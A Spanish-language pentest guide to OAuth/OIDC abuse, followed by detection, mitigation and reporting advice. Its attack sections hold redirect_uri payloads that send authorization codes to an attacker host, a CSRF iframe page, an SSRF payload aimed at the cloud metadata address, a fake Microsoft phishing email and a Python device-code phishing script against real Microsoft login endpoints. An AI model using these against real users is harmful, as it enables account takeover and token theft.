# OAuth/OIDC: Flujos y Abusos

## Resumen

**Qué es:** OAuth 2.0 es un framework de autorización que permite acceso delegado a recursos, y OpenID Connect (OIDC) su extensión para autenticación basada en tokens JWT.
**Por qué importa:** Errores de implementación permiten bypass de autenticación, escalado de privilegios, secuestro de cuentas y acceso persistente no autorizado.
**Cuándo aplicarlo:** Fundamental en pentests donde las apps usan "Login con Google/Facebook", SSO empresarial, APIs protegidas por OAuth o flujos de autenticación delegada.

---

## Contexto

**Supuestos:**

- La aplicación utiliza OAuth 2.0/OIDC para autenticación o autorización (flows: Authorization Code, Implicit, Device Code, Client Credentials).
- Acceso a interceptar tráfico HTTP/HTTPS (Burp Suite, OWASP ZAP, DevTools).
- Capacidad para modificar parámetros de autorización (`redirect_uri`, `state`, `scope`, `client_id`, etc.).
- Entorno con proveedores OAuth comunes (Google, Microsoft, Facebook, GitHub) o implementaciones custom.
- Versiones probadas: OAuth 2.0/2.1, OIDC 1.0, librerías como `passport-oauth2`, `spring-security-oauth2`, `authlib`.

**Límites:**

- Excluye SAML y autenticación tradicional sin OAuth.
- Foco en vulnerabilidades de implementación, no en el protocolo base.

---

## Metodología

1. **Identificación del flujo OAuth:**

   - Localiza endpoints (`/authorization`, `/token`, `/userinfo`) y parámetros clave.
   - Identifica el grant type usado (authorization code, implicit, device code).
   - Mapea el proveedor OAuth y documentación disponible.
2. **Reconocimiento de endpoints:**

   - Prueba `/.well-known/oauth-authorization-server` y `/.well-known/openid-configuration`.
   - Analiza respuestas para identificar funcionalidades soportadas.
3. **Análisis de parámetros críticos:**

   - `redirect_uri`: validación, bypass, open redirects.
   - `state`: presencia, entropía, reutilización (CSRF).
   - `scope`: escalado, validación indebida.
   - `client_id`: aplicaciones maliciosas, first-party abuse.
4. **Pruebas de flujos específicos:**

   - **Authorization Code:** interceptación de códigos, PKCE bypass.
   - **Implicit:** manipulación de tokens en URL fragments.
   - **Device Code:** phishing de códigos, polling attacks.
5. **Validación de tokens:**

   - ID tokens: verificación de firma, claims (`iss`, `aud`, `exp`, `nonce`).
   - Access tokens: scope upgrade, reutilización indebida.
6. **Pruebas de registro dinámico:**

   - OpenID Dynamic Client Registration para SSRF.
   - Inyección en `logo_uri`, `jwks_uri` parameters.
7. **Análisis post-compromiso:**

   - Persistencia via refresh tokens.
   - Escalado a otros recursos/APIs.

**Checklist de verificación:**

- Validación estricta de `redirect_uri` (exact match, whitelisting).
- Parámetro `state` obligatorio, único e impredecible.
- PKCE implementado para flows públicos.
- Validación correcta de scope en intercambio de tokens.
- ID tokens firmados y validados apropiadamente.
- Refresh tokens revocables y con expiración.
- Rate limiting en endpoints sensibles.

---

## Pruebas Manuales

### Herramientas principales

- **Burp Suite con JWT Editor** para manipular tokens
- **oauth-hunter** para automatizar bypass de `redirect_uri`
- **curl/httpie** para requests manuales
- **jwt.io** para decodificar tokens

### Proceso manual reproducible

#### 1. Manipulación de redirect_uri

**Objetivo:** Redirigir el authorization code/token a dominio del atacante.

```bash
# URL base del flujo OAuth
https://victima.com/auth?client_id=123&redirect_uri=https://victima.com/callback&response_type=code&state=abc123

# Prueba 1: Cambio directo a dominio atacante
https://victima.com/auth?client_id=123&redirect_uri=https://atacante.com/collect&response_type=code&state=abc123

# Prueba 2: Subdirectorio bypass
https://victima.com/auth?redirect_uri=https://victima.com/callback/../../path&response_type=code

# Prueba 3: Open redirect via parámetro
https://victima.com/auth?redirect_uri=https://victima.com/redirect?next=https://atacante.com&response_type=code

# Prueba 4: IDN homograph attack
https://victima.com/auth?redirect_uri=https://víctima.com/callback&response_type=code
```

**Evidencias esperadas:** Authorization code enviado a `atacante.com/collect?code=ABCD1234`.

#### 2. CSRF via state parameter bypass

**Preparación del atacante:**

```bash
# 1. Atacante inicia flujo OAuth y captura su propio authorization code
curl "https://oauth-provider.com/auth?client_id=123&redirect_uri=https://victima.com/callback&response_type=code" 
# Obtiene: code=ATTACKER_CODE

# 2. Atacante detiene su flujo antes del intercambio por token
```

**Página maliciosa del atacante:**

```html
<!DOCTYPE html>
<html>
<body>
    <!-- Auto-submit del código del atacante a la víctima -->
    <iframe src="https://victima.com/callback?code=ATTACKER_CODE&state="></iframe>
    <!-- Si state no se valida, víctima queda logueada como el atacante -->
</body>
</html>
```

#### 3. Implicit Flow - Account takeover

**Captura del flujo legítimo:**

```http
POST /authenticate HTTP/1.1
Host: victima.com
Content-Type: application/x-www-form-urlencoded

email=user@victima.com&access_token=ya29.VALID_TOKEN&name=Usuario
```

**Manipulación maliciosa:**

```http
POST /authenticate HTTP/1.1
Host: victima.com
Content-Type: application/x-www-form-urlencoded

email=admin@victima.com&access_token=ya29.ATTACKER_TOKEN&name=Admin
```

Si la app no valida que el access_token corresponde al email, el atacante accede como admin.

#### 4. Device Code Phishing

**Paso 1 - Atacante inicia device flow:**

```bash
curl -X POST https://oauth-provider.com/device_authorization \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=microsoft-word-client&scope=https://graph.microsoft.com/.default"

# Respuesta:
# {
#   "device_code": "GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS",
#   "user_code": "WDJB-MJHT", 
#   "verification_uri": "https://microsoft.com/devicelogin",
#   "expires_in": 900
# }
```

**Paso 2 - Phishing a la víctima:**

```
Asunto: Actualización requerida - Microsoft Word

Hola, 

Para continuar usando Microsoft Word, ingresa este código: WDJB-MJHT
en: https://microsoft.com/devicelogin

Equipo de Microsoft
```

**Paso 3 - Atacante hace polling:**

```bash
while true; do
  curl -s -X POST https://oauth-provider.com/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS&client_id=microsoft-word-client"
  sleep 5
done
```

Cuando la víctima autentica, el atacante obtiene access token válido.

---

## PoC Automatizada

### Script para redirect_uri bypass

```python
#!/usr/bin/env python3
import requests
import urllib.parse
from urllib.parse import urlparse, parse_qs

def test_redirect_uri_bypass(base_url, client_id, payloads):
    """
    Prueba bypass de redirect_uri con múltiples payloads
    """
    results = []
  
    for payload in payloads:
        params = {
            'client_id': client_id,
            'redirect_uri': payload,
            'response_type': 'code',
            'state': 'test123'
        }
      
        try:
            response = requests.get(f"{base_url}/authorization", 
                                  params=params, 
                                  allow_redirects=False)
          
            if response.status_code in [302, 200]:
                results.append({
                    'payload': payload,
                    'status': 'POTENTIAL_BYPASS',
                    'response_code': response.status_code,
                    'location': response.headers.get('Location', 'N/A')
                })
        except Exception as e:
            continue
          
    return results

# Payloads comunes
payloads = [
    "https://atacante.com/callback",
    "https://victima.com@atacante.com/callback", 
    "https://victima.com/callback/../../redirect",
    "https://victima.com/callback?to=https://atacante.com",
    "https://víctima.com/callback"  # IDN homograph
]

results = test_redirect_uri_bypass("https://victima.com", "12345", payloads)
```

### Device Code Automation

```python
#!/usr/bin/env python3
import requests
import time
import json

def device_code_attack(client_id, scope, auth_url, token_url):
    """
    Automatiza device code phishing
    """
    # Paso 1: Iniciar device authorization
    device_data = {
        'client_id': client_id,
        'scope': scope
    }
  
    response = requests.post(f"{auth_url}/device_authorization", data=device_data)
    device_info = response.json()
  
    print(f"[+] Device Code: {device_info['device_code']}")
    print(f"[+] User Code: {device_info['user_code']}")
    print(f"[+] Verification URL: {device_info['verification_uri']}")
    print(f"\n[!] Envía a la víctima: {device_info['verification_uri']}")
    print(f"[!] Código a ingresar: {device_info['user_code']}")
  
    # Paso 2: Polling para tokens
    print("\n[*] Esperando autenticación de víctima...")
  
    while True:
        token_data = {
            'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
            'device_code': device_info['device_code'],
            'client_id': client_id
        }
      
        token_response = requests.post(f"{token_url}/token", data=token_data)
        token_result = token_response.json()
      
        if 'access_token' in token_result:
            print(f"\n[+] ¡ÉXITO! Access Token obtenido:")
            print(f"    {token_result['access_token']}")
            return token_result
          
        elif token_result.get('error') == 'authorization_pending':
            time.sleep(device_info.get('interval', 5))
            continue
          
        else:
            print(f"[-] Error: {token_result}")
            break
  
    return None

# Ejemplo de uso
token = device_code_attack(
    client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Word
    scope="https://graph.microsoft.com/.default",
    auth_url="https://login.microsoftonline.com/common/oauth2",
    token_url="https://login.microsoftonline.com/common/oauth2"
)
```

---

## Explotación y Automatización

### Variantes avanzadas

**1. Chaining con Open Redirects:**

```bash
# Si victima.com/redirect es vulnerable a open redirect
https://oauth-provider.com/auth?redirect_uri=https://victima.com/redirect?url=https://atacante.com/collect
```

**2. OAuth Application Registration Attack:**

```python
# Registro dinámico de cliente malicioso
malicious_app = {
    "redirect_uris": ["https://atacante.com/callback"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/",  # SSRF
    "application_type": "web"
}

requests.post("https://victima.com/.well-known/openid_clients_registration", 
              json=malicious_app)
```

**3. Scope Upgrade Attack:**

```python
# Intercambio de código con scope escalado
token_request = {
    'grant_type': 'authorization_code',
    'code': 'intercepted_code',
    'client_id': 'malicious_client',
    'client_secret': 'secret',
    'scope': 'read write admin'  # Más permisos que los originalmente autorizados
}
```

**4. Race Condition en Authorization Codes:**

```python
import threading
import requests

def exchange_code(code):
    requests.post('/token', data={'code': code, 'grant_type': 'authorization_code'})

# Múltiples threads intentan usar el mismo código
code = "intercepted_authorization_code"
for i in range(10):
    threading.Thread(target=exchange_code, args=(code,)).start()
```

---

## Impacto

**Escenarios de compromiso:**

- **Account Takeover completo:** Acceso a datos personales, funcionalidades administrativas.
- **Escalado de privilegios:** De usuario regular a admin via scope upgrade.
- **Persistencia:** Refresh tokens válidos para acceso a largo plazo.
- **Lateral movement:** Acceso a múltiples servicios integrados via SSO.

**Mapeo OWASP/CWE:**

- **A07:2021 - Identification and Authentication Failures**
- **A01:2021 - Broken Access Control**
- **CWE-287:** Improper Authentication
- **CWE-352:** Cross-Site Request Forgery
- **CWE-601:** Open Redirect

**Severidad típica:**

- **CVSS 8.1-9.0:** Account takeover con escalado de privilegios[72][88][89]
- **CVSS 6.1-7.4:** CSRF, información disclosure, bypass de autenticación

---

## Detección

**Qué monitorear:**

**En logs de aplicación:**

- Fallos de validación de `redirect_uri` (dominios externos, paths sospechosos)
- Parámetros `state` faltantes, reutilizados o con baja entropía
- Intercambios de código/token desde IPs inusuales
- Scope requests anómalos o escalados
- Multiple authorization attempts en corto período

**En logs OAuth Provider:**

- Device code requests masivos desde misma IP
- Client registrations con `redirect_uri` sospechosos
- Access token usage desde geolocalización inconsistente
- Refresh token abuse (múltiples renewals)

**En WAF/CDN:**

- Requests a `/.well-known/*` endpoints desde attackers
- Open redirect attempts via `redirect_uri` parameter
- Anomalías en User-Agent durante OAuth flows

**En EDR/Network:**

- Outbound connections a dominios recién registrados post-OAuth
- DNS queries para IDN homograph domains
- Traffic patterns consistentes con token exfiltration

---

## Mitigación

### Configuración OAuth Provider

**Strict redirect_uri validation:**

```json
{
  "redirect_uris": ["https://app.victima.com/callback"],
  "require_exact_match": true,
  "allow_localhost": false
}
```

**PKCE obligatorio:**

```javascript
// Generar code_verifier y code_challenge
const codeVerifier = generateRandomString(128);
const codeChallenge = base64URLEncode(sha256(codeVerifier));

// Authorization request
const authUrl = `https://oauth-provider.com/auth?
  client_id=123&
  redirect_uri=https://app.com/callback&
  code_challenge=${codeChallenge}&
  code_challenge_method=S256&
  response_type=code&
  state=${uniqueState}`;
```

**Token validation robusta:**

```python
def validate_oauth_response(code, state, stored_state):
    # 1. Validar state parameter
    if not state or state != stored_state:
        raise SecurityError("Invalid state parameter")
  
    # 2. Intercambiar código por token con PKCE
    token_response = exchange_code_for_token(code, code_verifier)
  
    # 3. Validar ID token si presente
    if 'id_token' in token_response:
        validate_id_token(token_response['id_token'])
  
    return token_response
```

### Client Application Security

**Input validation:**

```python
ALLOWED_OAUTH_PROVIDERS = [
    'accounts.google.com',
    'login.microsoftonline.com',
    'github.com'
]

def validate_oauth_request(provider, user_data, access_token):
    # Validar proveedor
    if provider not in ALLOWED_OAUTH_PROVIDERS:
        raise ValueError("Unauthorized OAuth provider")
  
    # Validar que access_token corresponde a user_data
    if not verify_token_ownership(access_token, user_data['email']):
        raise SecurityError("Token/user data mismatch")
```

**Session management:**

```python
def handle_oauth_login(user_data, access_token):
    # No confiar ciegamente en datos del proveedor
    existing_user = User.find_by_email(user_data['email'])
  
    if not existing_user:
        # Verificar email ownership antes de crear cuenta
        if not verify_email_with_provider(user_data['email'], access_token):
            raise SecurityError("Email verification failed")
  
    # Crear sesión segura
    session_token = generate_secure_session_token()
    return create_authenticated_session(existing_user, session_token)
```

**Pruebas post-implementación:**

- Automated testing de redirect_uri bypass attempts
- State parameter entropy validation
- PKCE flow compliance testing
- ID token signature verification
- Scope escalation prevention testing

---

## Errores Comunes

**Falsos positivos frecuentes:**

- Interpretar redirects legítimos a subdominios como bypass
- Flagear device code flows legítimos como ataques
- Asumir que todos los first-party clients son seguros

**Falsos negativos peligrosos:**

- No probar variaciones de encoding en redirect_uri
- Omitir pruebas de race conditions en authorization codes
- No validar claim `aud` en ID tokens multi-tenant
- Ignorar ataques via registration dinámico de clientes

**Limitaciones de testing:**

- Algunos ataques requieren interacción real de usuario
- Rate limiting puede impedir testing automatizado exhaustivo
- Proveedores OAuth pueden tener detecciones internas

---

## Reporte

**Título:** Múltiples vulnerabilidades en implementación OAuth/OIDC permiten account takeover

**Impacto:** Bypass completo de autenticación, escalado de privilegios y acceso persistente no autorizado a cuentas de usuario.

**Pasos de reproducción:**

1. Interceptar flujo OAuth en `/authorization` endpoint
2. Manipular parámetro `redirect_uri` a `https://atacante.com/collect`
3. Víctima completa autenticación normalmente
4. Authorization code enviado a dominio del atacante
5. Atacante usa código para obtener access token válido
6. Acceso completo a cuenta de víctima logrado

**Evidencias críticas:**

- Request/response mostrando redirect_uri bypass
- Authorization code capturado en servidor atacante
- Access token válido obtenido con código interceptado
- Login exitoso como víctima usando token robado

**Mitigación inmediata:**

- Implementar validación estricta de redirect_uri (exact match)
- Forzar uso de parámetro state con alta entropía
- Habilitar PKCE para todos los flujos públicos
- Validar apropiadamente signatures de ID tokens

**Referencias técnicas:**

- OWASP OAuth Security Cheat Sheet
- RFC 6749 - OAuth 2.0 Authorization Framework
- RFC 7636 - PKCE Extension
- PortSwigger OAuth Authentication Vulnerabilities[73][72][88]
